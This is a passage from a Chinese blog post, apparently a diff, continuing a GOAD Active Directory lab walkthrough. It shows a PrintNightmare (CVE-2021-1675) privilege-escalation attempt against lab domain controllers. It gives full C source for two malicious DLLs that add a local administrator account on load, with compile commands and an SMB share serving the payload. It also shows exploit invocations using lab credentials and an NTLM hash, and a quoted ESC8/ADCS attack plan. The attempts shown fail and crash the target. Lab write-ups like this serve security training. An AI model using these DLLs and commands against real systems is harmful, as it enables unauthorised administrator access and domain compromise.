+<p>报了些错误，不过问题不大，ntds哈希导出成功，北境沦陷，临冬城被付之一炬，现在着手清理痕迹吧。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-addcomputer -computer-<span class="hljs-type">name</span> <span class="hljs-string">&#x27;samaccount$&#x27;</span> -<span class="hljs-keyword">delete</span> -dc-host winterfell.north.sevenkingdoms.<span class="hljs-keyword">local</span> -<span class="hljs-keyword">domain</span>-netbios NORTH -hashes <span class="hljs-string">&#x27;aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4&#x27;</span> <span class="hljs-string">&#x27;north.sevenkingdoms.local/Administrator&#x27;</span><br>Impacket v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><br>[*] Successfully deleted samaccount$.<br><br></code></pre></td></tr></table></figure>
+
+<p>成功删除了添加的恶意机器账户。</p>
+<p>下一个目标是利用PrintNightmare攻击弥林。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kqdssheng/p/18753135">Windows 提权-PrintNightmare - 扛枪的书生 - 博客园</a></p>
+<p>查看目标机器是否运行服务。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# impacket-rpcdump @192.168.10.12 | egrep <span class="hljs-string">&#x27;MS-RPRN|MS-PAR&#x27;</span><br>Protocol: [MS-RPRN]: <span class="hljs-built_in">Print</span><span class="hljs-built_in"> System </span>Remote Protocol <br>Protocol: [MS-PAR]: <span class="hljs-built_in">Print</span><span class="hljs-built_in"> System </span>Asynchronous Remote Protocol <br></code></pre></td></tr></table></figure>
+
+<p>准备恶意文件 nightmare.c。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span> </span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">RunCMD</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;net users pnightmare Passw0rd123. /add&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;net localgroup administrators pnightmare /add&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">    LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-built_in">RunCMD</span>();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>编译为恶意dll文件。</p>
+<p>要注意这个漏洞只能在旧的winserver2016也就是弥林这个域控上用。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(root㉿kaada)-[<span class="hljs-regexp">/home/</span>kali/Desktop]<br>└─<span class="hljs-comment"># vim nightmare.c</span><br>                                                                                                                                                           <br>┌──(root㉿kaada)-[<span class="hljs-regexp">/home/</span>kali/Desktop]<br>└─<span class="hljs-comment"># x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c</span><br><br></code></pre></td></tr></table></figure>
+
+<p>准备一个带有恶意dll文件的smb共享</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs armasm">┌──(root㉿kaada)-[/<span class="hljs-meta">opt</span>/printnightmare]<br>└─# ls<br><span class="hljs-symbol">CVE</span>-<span class="hljs-number">2021</span>-<span class="hljs-number">1675</span>.py  Images  nightmare.dll  README.md  SharpPrintNightmare<br>                                                                                                                                                           <br>┌──(root㉿kaada)-[/<span class="hljs-meta">opt</span>/printnightmare]<br>└─# impacket-smbserver -smb2support ATTACKERSHARE .<br><span class="hljs-symbol">Impacket</span> v0.<span class="hljs-number">14</span>.<span class="hljs-number">0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> <span class="hljs-keyword">its</span> affiliated companies <br><br></code></pre></td></tr></table></figure>
+
+<p>攻击，但是报错了。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/opt/printnightmare]<br>└─# python CVE<span class="hljs-number">-2021</span><span class="hljs-number">-1675.</span>py essos.<span class="hljs-keyword">local</span>/jorah.mormont:<span class="hljs-string">&#x27;H0nnor!&#x27;</span>@meereen.essos.<span class="hljs-keyword">local</span> <span class="hljs-string">&#x27;\\192.168.10.150\ATTACKERSHARE\nightmare.dll&#x27;</span><br>[*] Connecting <span class="hljs-keyword">to</span> ncacn_np:meereen.essos.<span class="hljs-keyword">local</span>[\PIPE\spoolss]<br>[+] Bind OK<br>[+] pDriverPath <span class="hljs-built_in">Found</span> C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_e233a12d01c18082\Amd64\UNIDRV.DLL<br>[*] Executing \??\UNC\<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.150</span>\ATTACKERSHARE\nightmare.dll<br>[*] Try <span class="hljs-number">1.</span>..<br>Traceback (most recent <span class="hljs-keyword">call</span> last):<br>  File &quot;/opt/printnightmare/CVE-2021-1675.py&quot;, <span class="hljs-type">line</span> <span class="hljs-number">188</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    main(dce, pDriverPath, <span class="hljs-keyword">options</span>.<span class="hljs-keyword">share</span>)<br>    ~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^<br>  File &quot;/opt/printnightmare/CVE-2021-1675.py&quot;, <span class="hljs-type">line</span> <span class="hljs-number">93</span>, <span class="hljs-keyword">in</span> main<br>    resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)<br>  File &quot;/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rprn.py&quot;, <span class="hljs-type">line</span> <span class="hljs-number">657</span>, <span class="hljs-keyword">in</span> hRpcAddPrinterDriverEx<br>    <span class="hljs-keyword">return</span> dce.request(request)<br>           ~~~~~~~~~~~^^^^^^^^^<br>  File &quot;/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py&quot;, <span class="hljs-type">line</span> <span class="hljs-number">1436</span>, <span class="hljs-keyword">in</span> request<br>    <span class="hljs-keyword">raise</span> <span class="hljs-keyword">exception</span><br>impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: <span class="hljs-number">0x35</span> - ERROR_BAD_NETPATH - The network <span class="hljs-type">path</span> was <span class="hljs-keyword">not</span> <span class="hljs-built_in">found</span>.<br>                                                                                                                                 <br></code></pre></td></tr></table></figure>
+
+<p>停掉防火墙试试，但是靶机服务崩了。</p>
+<p>歇菜了这下.</p>
+<blockquote>
+<ul>
+<li>需要知道的是：在一些失败之后，spooler服务将被defender停止，并且在有人重新启动服务器或spooler服务之前不会再被利用。</li>
+</ul>
+</blockquote>
+<p>那只能打临冬城试试了，不过临冬城是有windowsdefender的，得换一个恶意dll文件。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ADDUSER.C: creating a Windows user programmatically.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UNICODE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _UNICODE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;lmaccess.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;lmerr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><br><span class="hljs-function">DWORD <span class="hljs-title">CreateAdminUserInternal</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    NET_API_STATUS rc;<br>    BOOL b;<br>    DWORD dw;<br><br>    USER_INFO_1 ud;<br>    LOCALGROUP_MEMBERS_INFO_0 gd;<br>    SID_NAME_USE snu;<br><br>    DWORD cbSid = <span class="hljs-number">256</span>;    <span class="hljs-comment">// 256 bytes should be enough for everybody :)</span><br>    BYTE Sid[<span class="hljs-number">256</span>];<br><br>    DWORD cbDomain = <span class="hljs-number">256</span> / <span class="hljs-built_in">sizeof</span>(TCHAR);<br>    TCHAR Domain[<span class="hljs-number">256</span>];<br><br>    <span class="hljs-comment">// Create user</span><br>    <span class="hljs-built_in">memset</span>(&amp;ud, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(ud));<br><br>    ud.usri1_name        = _T(<span class="hljs-string">&quot;pnightmare2&quot;</span>);                <span class="hljs-comment">// username</span><br>    ud.usri1_password    = _T(<span class="hljs-string">&quot;Test123456789!&quot;</span>);             <span class="hljs-comment">// password</span><br>    ud.usri1_priv        = USER_PRIV_USER;                   <span class="hljs-comment">// cannot set USER_PRIV_ADMIN on creation</span><br>    ud.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;    <span class="hljs-comment">// must be set</span><br>    ud.usri1_script_path = <span class="hljs-literal">NULL</span>;<br><br>    rc = <span class="hljs-built_in">NetUserAdd</span>(<br>        <span class="hljs-literal">NULL</span>,            <span class="hljs-comment">// local server</span><br>        <span class="hljs-number">1</span>,                <span class="hljs-comment">// information level</span><br>        (LPBYTE)&amp;ud,<br>        <span class="hljs-literal">NULL</span>            <span class="hljs-comment">// error value</span><br>    );<br><br>    <span class="hljs-keyword">if</span> (rc != NERR_Success) &#123;<br>        _tprintf(_T(<span class="hljs-string">&quot;NetUserAdd FAIL %d 0x%08x\r\n&quot;</span>), rc, rc);<br>        <span class="hljs-keyword">return</span> rc;<br>    &#125;<br><br>   _tprintf(_T(<span class="hljs-string">&quot;NetUserAdd OK\r\n&quot;</span>), rc, rc);<br><br>    <span class="hljs-comment">// Get user SID</span><br>    b = <span class="hljs-built_in">LookupAccountName</span>(<br>        <span class="hljs-literal">NULL</span>,            <span class="hljs-comment">// local server</span><br>        ud.usri1_name,   <span class="hljs-comment">// account name</span><br>        Sid,             <span class="hljs-comment">// SID</span><br>        &amp;cbSid,          <span class="hljs-comment">// SID size</span><br>        Domain,          <span class="hljs-comment">// Domain</span><br>        &amp;cbDomain,       <span class="hljs-comment">// Domain size</span><br>        &amp;snu             <span class="hljs-comment">// SID_NAME_USE (enum)</span><br>    );<br><br>    <span class="hljs-keyword">if</span> (!b) &#123;<br>        dw = <span class="hljs-built_in">GetLastError</span>();<br>        _tprintf(_T(<span class="hljs-string">&quot;LookupAccountName FAIL %d 0x%08x\r\n&quot;</span>), dw, dw);<br>        <span class="hljs-keyword">return</span> dw;<br>    &#125;<br><br>    <span class="hljs-comment">// Add user to &quot;Administrators&quot; local group</span><br>    <span class="hljs-built_in">memset</span>(&amp;gd, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(gd));<br><br>    gd.lgrmi0_sid = (PSID)Sid;<br><br>    rc = <span class="hljs-built_in">NetLocalGroupAddMembers</span>(<br>        <span class="hljs-literal">NULL</span>,                    <span class="hljs-comment">// local server</span><br>        _T(<span class="hljs-string">&quot;Administrators&quot;</span>),<br>        <span class="hljs-number">0</span>,                        <span class="hljs-comment">// information level</span><br>        (LPBYTE)&amp;gd,<br>        <span class="hljs-number">1</span>                        <span class="hljs-comment">// only one entry</span><br>    );<br><br>    <span class="hljs-keyword">if</span> (rc != NERR_Success) &#123;<br>        _tprintf(_T(<span class="hljs-string">&quot;NetLocalGroupAddMembers FAIL %d 0x%08x\r\n&quot;</span>), rc, rc);<br>        <span class="hljs-keyword">return</span> rc;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// DLL entry point.</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-built_in">CreateAdminUserInternal</span>();<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-comment">// RUNDLL32 entry point</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>__declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> __stdcall <span class="hljs-title">CreateAdminUser</span><span class="hljs-params">(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, <span class="hljs-type">int</span> nCmdShow)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">CreateAdminUserInternal</span>();<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">// Command-line entry point.</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">CreateAdminUserInternal</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">┌──(root㉿kaada)-[/<span class="hljs-keyword">opt</span>/printnightmare]<br>└─# <span class="hljs-keyword">python3</span> CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">1675</span>.<span class="hljs-keyword">py</span> north.sevenkingdoms.local/jon.snow:<span class="hljs-string">&#x27;iknownothing&#x27;</span>@winterfell.north.sevenkingdoms.local <span class="hljs-string">&#x27;\\192.168.10.150\ATTACKERSHARE\pnightmare2.dll&#x27;</span><br>[*] Connecting <span class="hljs-keyword">to</span> ncacn_np:winterfell.north.sevenkingdoms.local[\PIPE\spoolss]<br>[-] Connection Failed<br>                                                                                                                                                           <br>┌──(root㉿kaada)-[/<span class="hljs-keyword">opt</span>/printnightmare]<br>└─# <span class="hljs-keyword">ls</span><br>ADDUSER.C  CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">1675</span>.<span class="hljs-keyword">py</span>  Images  nightmare.dll  pnightmare2.dll  README.md  SharpPrintNightmare<br>                                                                                                           <br></code></pre></td></tr></table></figure>
+
+<p>神人了。</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autoit">┌──(root㉿kaada)-[/opt/printnightmare]<br>└─<span class="hljs-meta"># smbclient //192.168.10.11/Users -U <span class="hljs-string">&#x27;north.sevenkingdoms.local/jon.snow%iknownothing&#x27;</span> -c <span class="hljs-string">&#x27;put pnightmare2.dll Public\pnightmare2.dll&#x27;</span></span><br>do_connect: Connection <span class="hljs-keyword">to</span> <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span> failed (Error NT_STATUS_IO_TIMEOUT)<br>                                                           ┌──(root㉿kaada)-[/opt/printnightmare]<br>└─<span class="hljs-meta"># ping 192.168.10.11</span><br><span class="hljs-built_in">PING</span> <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span> (<span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>) <span class="hljs-number">56</span>(<span class="hljs-number">84</span>) bytes of data.<br>^C<br>--- <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span> <span class="hljs-built_in">ping</span> statistics ---<br><span class="hljs-number">90</span> packets transmitted, <span class="hljs-number">0</span> received, <span class="hljs-number">100</span>% packet loss, time <span class="hljs-number">91193</span>ms<br><br>                    <br></code></pre></td></tr></table></figure>
+
+<p>唉，算了，知道有这么个事就行。</p>
+<p>下面测试的是在域中设置了 ADCS 的情况下进行攻击。 首先，我们将使用 petitpotam unauthenticated 和 ESC8 攻击获取 essos.local 上的域管理员，接下来我们将使用 certipy、bloodhound 和用户帐户枚举模板证书。 最后，我们将利用以下攻击：certipy、esc1、esc2、esc3、esc4、esc6、certifried 和 shadow credentials。</p>
+<blockquote>
+<h2 id="ESC8-coerce-to-domain-admin"><a href="#ESC8-coerce-to-domain-admin" class="headerlink" title="ESC8 - coerce to domain admin"></a>ESC8 - coerce to domain admin</h2><ul>
+<li>为了使这种攻击起作用，我们需要：<ul>
+<li>ADCS 在启用了 Web 注册的域上运行。</li>
+<li>一种有效的coerce方法（这里我们使用 petitpotam unauthent，但经过身份验证的 printerbug 或其他强制方法将同样有效）</li>
+<li>有一个有用的模板可以利用 ESC8，默认情况下在活动目录上，它的名字是 DomainController</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p>靶机服务彻底崩了…….重装了一遍。可能ip会有变动。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/GOAD/" class="print-no-link">#GOAD</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>从零开始的GOAD生活(中)</div>
+      <div>http://example.com/2026/02/02/从零开始的GOAD生活-中/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>February 2, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/02/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84GOAD%E7%94%9F%E6%B4%BB-%E4%B8%8A/" title="从零开始的GOAD生活(上)">
+                        <span class="hidden-mobile">从零开始的GOAD生活(上)</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <style>.statistics { display: none !important; }</style>
+<a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+<br>
+<script async src="//cdn.busuanzi.cc/busuanzi/3.6.9/busuanzi.min.js"></script>
+<span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_site_pv" style="color:red">...</span> 次 </span> &nbsp; | &nbsp; <span id="busuanzi_container_site_uv"> 总访客数 <span id="busuanzi_site_uv" style="color:red">...</span> 人 </span> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
